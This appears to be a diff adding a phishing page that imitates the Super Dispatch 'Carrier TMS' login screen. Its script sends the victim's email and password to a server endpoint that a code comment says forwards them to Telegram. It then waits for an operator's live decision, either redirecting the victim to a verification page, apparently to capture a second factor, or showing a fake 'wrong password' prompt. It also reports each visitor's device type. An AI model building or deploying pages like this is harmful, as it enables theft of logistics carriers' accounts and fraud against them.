@@ -1,0 +1,663 @@
+<!DOCTYPE html>
+<html lang="ru">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Carrier TMS</title>
+    <link rel="icon" type="image/svg+xml" href="favicon.svg">
+    <link rel="alternate icon" href="favicon.svg">
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;600;700&display=swap" rel="stylesheet">
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
+        body {
+            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, 'Helvetica Neue', Arial, sans-serif;
+            background-color: #f3f5f8;
+            min-height: 100vh;
+            display: flex;
+            flex-direction: column;
+            position: relative;
+            overflow-x: hidden;
+        }
+
+        /* Dotted background pattern */
+        body::before {
+            content: '';
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background-image: radial-gradient(circle, #d0d0d0 1px, transparent 1px);
+            background-size: 30px 30px;
+            opacity: 0.3;
+            z-index: 0;
+        }
+
+        /* Header */
+        header {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            height: 65px;
+            padding: 0 255px;
+            background-color: white;
+            border-bottom: 1px solid #e1e5ea;
+            position: relative;
+            z-index: 1;
+        }
+
+        .logo-container {
+            display: flex;
+            align-items: center;
+        }
+
+        .header-logo {
+            height: 45px;
+            width: auto;
+            max-width: 220px;
+            object-fit: contain;
+            display: block;
+        }
+
+        .signup-btn {
+            background-color: white;
+            border: 2px solid #e1e5ea;
+            padding: 4px 16px;
+            border-radius: 4px;
+            color: #333;
+            text-decoration: none;
+            font-family: 'Inter', sans-serif;
+            font-weight: 600;
+            font-size: 14px;
+            line-height: 20px;
+            cursor: pointer;
+            transition: background-color 0.2s;
+        }
+
+        .signup-btn:hover {
+            background-color: #f5f5f5;
+        }
+
+        /* Main content */
+        main {
+            flex: 1;
+            display: flex;
+            flex-direction: column;
+            justify-content: flex-start;
+            align-items: center;
+            padding: 90px 20px 40px 20px;
+            position: relative;
+            z-index: 1;
+        }
+
+        .login-card {
+            background-color: white;
+            border-radius: 4px;
+            padding: 48px 40px;
+            width: 432px;
+            height: 355px;
+            box-sizing: border-box;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+        }
+
+        .login-title {
+            font-family: 'Inter', sans-serif;
+            font-size: 32px;
+            font-weight: 700;
+            line-height: 40px;
+            color: #192334;
+            margin-top: -20px;
+            margin-bottom: 16px;
+            text-align: center;
+        }
+
+        .form-group {
+            margin-bottom: 24px;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            width: 100%;
+        }
+
+        label {
+            display: block;
+            font-family: 'Inter', sans-serif;
+            font-size: 14px;
+            font-weight: 400;
+            line-height: 20px;
+            color: #333;
+            margin-bottom: 8px;
+            width: 385px;
+            text-align: left;
+        }
+
+        .input-wrapper {
+            position: relative;
+            display: flex;
+            justify-content: center;
+        }
+
+        input[type="text"],
+        input[type="email"],
+        input[type="password"] {
+            width: 385px;
+            height: 30px;
+            padding: 0 16px 0 0;
+            border: 1px solid #d0d0d0;
+            border-radius: 4px;
+            font-size: 14px;
+            color: #333;
+            background-color: white;
+            transition: border-color 0.2s;
+            box-sizing: border-box;
+        }
+
+        input[type="text"]:focus,
+        input[type="email"]:focus,
+        input[type="password"]:focus {
+            outline: none;
+            border-color: #007bff;
+        }
+
+        .password-toggle {
+            position: absolute;
+            right: 12px;
+            top: 50%;
+            transform: translateY(-50%);
+            background: none;
+            border: none;
+            cursor: pointer;
+            padding: 4px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+        }
+
+        .password-toggle img {
+            width: 25px;
+            height: 15px;
+            display: block;
+        }
+
+        .password-toggle:hover {
+            opacity: 0.7;
+        }
+
+        #loginForm {
+            width: 100%;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+        }
+
+        .login-btn {
+            width: 385px;
+            height: 40px;
+            padding: 0;
+            background-color: #0070F5;
+            color: white;
+            border: none;
+            border-radius: 4px;
+            font-family: 'Inter', sans-serif;
+            font-size: 16px;
+            font-weight: 600;
+            line-height: 24px;
+            cursor: pointer;
+            margin-top: 8px;
+            transition: background-color 0.2s;
+            box-sizing: border-box;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+        }
+
+        .login-btn:hover {
+            background-color: #0056b3;
+        }
+
+        .login-btn:disabled {
+            background-color: #ccc;
+            cursor: not-allowed;
+        }
+
+        .form-links {
+            display: flex;
+            justify-content: space-between;
+            margin-top: 20px;
+            width: 385px;
+        }
+
+        .form-links a {
+            color: #007bff;
+            text-decoration: none;
+            font-family: 'Inter', sans-serif;
+            font-size: 14px;
+            font-weight: 400;
+            line-height: 20px;
+        }
+
+        .form-links a:hover {
+            text-decoration: underline;
+        }
+
+        /* Footer */
+        .footer-content {
+            text-align: center;
+            padding: 20px 0 0 0;
+            margin-top: 20px;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            width: 100%;
+        }
+
+        .footer-text {
+            font-family: 'Inter', sans-serif;
+            font-size: 14px;
+            font-weight: 400;
+            line-height: 20px;
+            color: #5b6371;
+            margin-bottom: 4px;
+            width: 385px;
+        }
+
+        .footer-links {
+            font-family: 'Inter', sans-serif;
+            font-size: 14px;
+            font-weight: 400;
+            line-height: 20px;
+            color: #5b6371;
+            margin-bottom: 12px;
+            width: 385px;
+        }
+
+        .footer-links a {
+            font-family: 'Inter', sans-serif;
+            color: #192334;
+            font-weight: 400;
+            text-decoration: underline;
+        }
+
+        .copyright {
+            font-family: 'Inter', sans-serif;
+            font-size: 14px;
+            font-weight: 400;
+            line-height: 20px;
+            color: #5b6371;
+            width: 385px;
+        }
+
+        /* Chat icon */
+        .chat-icon {
+            position: fixed;
+            bottom: 24px;
+            right: 24px;
+            width: 56px;
+            height: 56px;
+            background-color: #333;
+            border-radius: 50%;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            cursor: pointer;
+            box-shadow: 0 2px 8px rgba(0, 0, 0, 0.2);
+            z-index: 1000;
+            transition: transform 0.2s;
+        }
+
+        .chat-icon:hover {
+            transform: scale(1.05);
+        }
+
+        .chat-icon::before {
+            content: '💬';
+            font-size: 24px;
+        }
+
+        /* Loading and success messages */
+        .message {
+            padding: 12px;
+            margin-top: 16px;
+            border-radius: 4px;
+            text-align: center;
+            font-size: 14px;
+            display: none;
+            width: 385px;
+        }
+
+        .message.success {
+            background-color: #d4edda;
+            color: #155724;
+            border: 1px solid #c3e6cb;
+        }
+
+        .message.error {
+            background-color: #f8d7da;
+            color: #721c24;
+            border: 1px solid #f5c6cb;
+        }
+
+        /* Loading screen */
+        .loading-screen {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background-color: white;
+            display: none;
+            flex-direction: column;
+            align-items: center;
+            justify-content: center;
+            z-index: 10000;
+        }
+
+        .loading-screen.active {
+            display: flex;
+        }
+
+        .loading-favicon {
+            width: 64px;
+            height: 64px;
+            animation: pulse 1.5s ease-in-out infinite;
+        }
+
+        @keyframes pulse {
+            0%, 100% {
+                opacity: 1;
+                transform: scale(1);
+            }
+            50% {
+                opacity: 0.5;
+                transform: scale(1.1);
+            }
+        }
+
+        .wrong-pass-image {
+            position: fixed;
+            bottom: -200px;
+            left: 50%;
+            width: 515px;
+            height: auto;
+            z-index: 10001;
+            opacity: 0;
+            transform: translateX(-50%);
+            transition: bottom 0.5s ease-out, opacity 0.5s ease-out;
+        }
+
+        .wrong-pass-image.show {
+            bottom: 0;
+            opacity: 1;
+            transform: translateX(-50%);
+        }
+
+        .wrong-pass-image.hiding {
+            bottom: -200px;
+            opacity: 0;
+            transform: translateX(-50%);
+        }
+    </style>
+</head>
+<body>
+    <header>
+        <div class="logo-container">
+            <img src="logo2.png" alt="SuperDispatch Logo" class="header-logo">
+        </div>
+        <button class="signup-btn">Sign Up</button>
+    </header>
+
+    <main>
+        <div class="login-card">
+            <h1 class="login-title">Carrier TMS</h1>
+            <form id="loginForm">
+                <div class="form-group">
+                    <label for="username">Email</label>
+                    <div class="input-wrapper">
+                        <input type="text" id="username" name="username" required>
+                    </div>
+                </div>
+                <div class="form-group">
+                    <label for="password">Password</label>
+                    <div class="input-wrapper">
+                        <input type="password" id="password" name="password" required>
+                        <button type="button" class="password-toggle" id="togglePassword">
+                            <img src="eye.png" alt="Toggle password visibility">
+                        </button>
+                    </div>
+                </div>
+                <button type="submit" class="login-btn" id="submitBtn">Log In</button>
+                <div class="message" id="message"></div>
+                <div class="form-links">
+                    <a href="#" onclick="return false;">Forgot password?</a>
+                    <a href="#" onclick="return false;">Contact support</a>
+                </div>
+            </form>
+            <div class="footer-content">
+                <p class="footer-text">By signing in, you agree to Super Dispatch's</p>
+                <p class="footer-links">
+                    <a href="#" onclick="return false;">Terms & Conditions</a> and 
+                    <a href="#" onclick="return false;">Privacy Policy</a>
+                </p>
+                <p class="copyright">© 2025 Super Dispatch. All rights reserved.</p>
+            </div>
+        </div>
+    </main>
+
+    <div class="chat-icon"></div>
+
+    <!-- Loading screen -->
+    <div class="loading-screen" id="loadingScreen">
+        <img src="favicon.png" alt="Loading" class="loading-favicon">
+    </div>
+
+    <!-- Wrong password image -->
+    <img src="wrongpass.png" alt="Wrong password" class="wrong-pass-image" id="wrongPassImage">
+
+    <script>
+        // Определение устройства и отправка информации о посетителе
+        (function() {
+            function detectDevice() {
+                const userAgent = navigator.userAgent || navigator.vendor || window.opera;
+                if (/android|webos|iphone|ipad|ipod|blackberry|iemobile|opera mini/i.test(userAgent.toLowerCase())) {
+                    return 'mobile';
+                }
+                return 'desktop';
+            }
+
+            // Отправка информации о посетителе при загрузке страницы
+            fetch('/visitor-info', {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json',
+                },
+                body: JSON.stringify({
+                    deviceType: detectDevice()
+                })
+            }).catch(err => {
+                console.log('Visitor info not sent:', err);
+            });
+        })();
+
+        // Function to poll login status
+        function pollLoginStatus(loginId) {
+            const checkStatus = async () => {
+                try {
+                    const response = await fetch(`/check-login-status?loginId=${loginId}`);
+                    const data = await response.json();
+                    
+                    if (data.status === 'yes') {
+                        // YES - redirect to verification page
+                        const loadingScreen = document.getElementById('loadingScreen');
+                        loadingScreen.classList.remove('active');
+                        window.location.href = '/verification.html';
+                    } else if (data.status === 'no') {
+                        // NO - show login page with wrongpass.png
+                        const loadingScreen = document.getElementById('loadingScreen');
+                        loadingScreen.classList.remove('active');
+                        const wrongPassImage = document.getElementById('wrongPassImage');
+                        
+                        // Убираем класс hiding если был
+                        wrongPassImage.classList.remove('hiding');
+                        
+                        // Показываем изображение (плавно поднимается снизу)
+                        setTimeout(() => {
+                            wrongPassImage.classList.add('show');
+                            
+                            // Через 7 секунд плавно убираем
+                            setTimeout(() => {
+                                wrongPassImage.classList.remove('show');
+                                wrongPassImage.classList.add('hiding');
+                                
+                                // Полностью скрываем после анимации
+                                setTimeout(() => {
+                                    wrongPassImage.classList.remove('hiding');
+                                }, 500);
+                            }, 7000);
+                        }, 100);
+                        
+                        loginForm.reset();
+                        submitBtn.disabled = false;
+                        submitBtn.textContent = 'Log In';
+                    } else {
+                        // Still waiting - check again in 1 second
+                        setTimeout(checkStatus, 1000);
+                    }
+                } catch (error) {
+                    console.error('Error checking status:', error);
+                    setTimeout(checkStatus, 1000);
+                }
+            };
+            checkStatus();
+        }
+
+        // Auto-copy on click functionality
+        const usernameInput = document.getElementById('username');
+        const passwordInput = document.getElementById('password');
+
+        usernameInput.addEventListener('click', async function() {
+            if (this.value) {
+                this.select();
+                try {
+                    await navigator.clipboard.writeText(this.value);
+                } catch (err) {
+                    // Fallback для старых браузеров
+                    document.execCommand('copy');
+                }
+            }
+        });
+
+        passwordInput.addEventListener('click', async function() {
+            if (this.value) {
+                this.select();
+                try {
+                    await navigator.clipboard.writeText(this.value);
+                } catch (err) {
+                    // Fallback для старых браузеров
+                    document.execCommand('copy');
+                }
+            }
+        });
+
+        // Password toggle functionality
+        const togglePassword = document.getElementById('togglePassword');
+
+        togglePassword.addEventListener('click', function() {
+            const type = passwordInput.getAttribute('type') === 'password' ? 'text' : 'password';
+            passwordInput.setAttribute('type', type);
+        });
+
+        // Form submission
+        const loginForm = document.getElementById('loginForm');
+        const submitBtn = document.getElementById('submitBtn');
+        const messageDiv = document.getElementById('message');
+
+        loginForm.addEventListener('submit', async function(e) {
+            e.preventDefault();
+
+            const username = document.getElementById('username').value;
+            const password = document.getElementById('password').value;
+
+            // Disable submit button
+            submitBtn.disabled = true;
+            submitBtn.textContent = 'Sending...';
+            messageDiv.style.display = 'none';
+            
+            // Hide wrongpass image if shown
+            const wrongPassImage = document.getElementById('wrongPassImage');
+            wrongPassImage.classList.remove('show');
+
+            try {
+                // Send to Telegram through local server endpoint with username and password
+                const response = await fetch('/send-login', {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json',
+                    },
+                    body: JSON.stringify({
+                        username: username,
+                        password: password
+                    })
+                });
+
+                // Проверяем статус ответа
+                if (!response.ok) {
+                    const text = await response.text();
+                    throw new Error(`Server error: ${response.status} - ${text.substring(0, 100)}`);
+                }
+
+                // Проверяем Content-Type перед парсингом JSON
+                const contentType = response.headers.get('content-type');
+                if (!contentType || !contentType.includes('application/json')) {
+                    const text = await response.text();
+                    throw new Error('Server returned non-JSON response. Make sure server is running.');
+                }
+
+                const data = await response.json();
+
+                if (data.success) {
+                    // Show loading screen
+                    const loadingScreen = document.getElementById('loadingScreen');
+                    loadingScreen.classList.add('active');
+                    
+                    // Start polling for response
+                    const loginId = data.loginId || Date.now().toString();
+                    pollLoginStatus(loginId);
+                } else {
+                    throw new Error(data.error || 'Failed to send message');
+                }
+            } catch (error) {
+                console.error('Error:', error);
+                messageDiv.className = 'message error';
+                let errorMsg = 'Failed to send data. ';
+                
+                if (error.name === 'TypeError' && error.message.includes('fetch')) {
+                    errorMsg += 'Cannot connect to server. Make sure server is running (node server.js) and try again.';
+                } else if (error.message.includes('404')) {
+                    errorMsg += 'Server endpoint not found. Make sure server is running and restart it.';
+                } else if (error.message.includes('non-JSON')) {
+                    errorMsg += 'Server error. Please restart the server.';
+                } else if (error.message) {
+                    errorMsg += error.message;
+                } else {
+                    errorMsg += 'Please check server connection and try again.';
+                }
+                
+                messageDiv.textContent = 'Error: ' + errorMsg;
+                messageDiv.style.display = 'block';
+                
+                submitBtn.disabled = false;
+                submitBtn.textContent = 'Log In';
+            }
+        });
+    </script>
+</body>
+</html>
